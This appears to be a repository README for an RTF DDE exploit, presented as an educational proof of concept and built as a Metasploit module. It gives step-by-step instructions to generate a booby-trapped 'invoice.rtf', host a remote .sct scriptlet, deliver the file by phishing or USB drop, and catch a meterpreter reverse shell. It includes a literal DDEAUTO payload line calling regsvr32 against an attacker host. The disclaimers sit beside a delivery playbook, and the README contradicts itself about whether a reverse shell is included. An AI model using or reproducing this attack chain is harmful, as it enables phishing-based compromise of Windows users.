# RTF DDE SCT Exploit (Educational PoC)

This repository contains an educational proof-of-concept RTF exploit that abuses the DDEAUTO field to execute a remote payload via regsvr32 and .sct scripting.

## ⚠️ Disclaimer

This code is provided **strictly for educational and ethical security research purposes**.  
Do not use in any unauthorized or malicious way.  
The author assumes no responsibility for misuse or damage.

## 💥 How It Works

- RTF embeds a DDEAUTO field calling cmd.exe
- Executes regsvr32 with a remote `.sct` file
- `.sct` triggers a PowerShell download-and-execute payload

## 🚫 Not Included

- No real malware or C2
- No reverse shell payloads
- No encoding, no bypass tricks

## 🔗 References

- [DDE abuse explained](https://www.fireeye.com/blog/threat-research/2017/11/deep-dive-into-dde-exploit.html)
- [MITRE T1217: Regsvr32](https://attack.mitre.org/techniques/T1217/)

## 🧪 Usage Instructions

This module creates a malicious RTF document that abuses DDE to execute a remote `.sct` scriptlet, which then triggers PowerShell to download and execute a payload. The flow is:

> Word opens → DDE triggers cmd.exe → regsvr32 fetches `.sct` → `.sct` launches PowerShell → Reverse shell

---

### 🛠 Requirements

* Metasploit Framework
* Linux (Kali, Parrot, etc.) or Windows with Ruby & Metasploit
* Python or another lightweight HTTP server (for testing)
* Network listener (e.g. `msfconsole`, `nc`, etc.)

---

## ⚙️ Step-by-Step Usage

---

### 🔹 **Step 1: Set Up Your Metasploit Module**

1. Place your `exploit.rb` file into:

```bash
~/.msf4/modules/exploits/windows/fileformat/
```

Or use a local Metasploit repo (if you're developing multiple modules).

---

### 🔹 **Step 2: Start Metasploit Console**

```bash
msfconsole
```

---

### 🔹 **Step 3: Load Your Module**

```bash
use exploit/windows/fileformat/your_module_name
```

Example:

```bash
use exploit/windows/fileformat/rtf_dde_sct
```

---

### 🔹 **Step 4: Set Options**

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
set FILENAME invoice.rtf
```

Other options:

```bash
set INJECT_PATH /path/to/custom_rtf_template.rtf   # Optional
```

---

### 🔹 **Step 5: Run the Exploit**

```bash
run
```

This will generate a malicious RTF file saved as `invoice.rtf` in Metasploit's `loot` directory.

---

### 🔹 **Step 6: Host the .sct Payload**

Metasploit will host a `.sct` file and PowerShell payload over HTTP.

Keep Metasploit running so it serves the `.sct` request when the victim opens the file.

---

### 🔹 **Step 7: Deliver the RTF File to Target**

* Via phishing
* As an email attachment
* Through USB drop or file share

⚠️ **Note:** This is for **lab use only**. Never use this in the wild.

---

### 🔹 **Step 8: Wait for Callback**

Once the victim opens the RTF in Word:

1. Word executes the embedded `DDEAUTO` field
2. Triggers `regsvr32 /i:http://attacker/shell.sct scrobj.dll`
3. `.sct` runs PowerShell payload
4. Reverse shell connects back to your listener

---

### 🔒 Example RTF DDE Payload:

```rtf
{\field{\*\fldinst {DDEAUTO "cmd.exe" "/c regsvr32 /s /n /u /i:http://<attacker_ip>:8080/payload.sct scrobj.dll"}}{\fldrslt }}}
```

---

## 📦 Output Files

* `invoice.rtf` → Malicious RTF payload
* `.sct` → Auto-generated on-the-fly by Metasploit’s HTTP server

---

## 🔬 Notes

* No macros needed
* Works even in "Protected View" (on some Office versions)
* Targets Windows systems with Microsoft Word installed
* Tested with:

  * Office 2013 / 2016
  * Windows 7 / 10

---

## 🧼 Cleanup

* Remove `.sct` and listener logs after use
* Never commit live C2 IPs or payloads into GitHub
* For demo: replace payload with `calc.exe` or `msgbox`

---
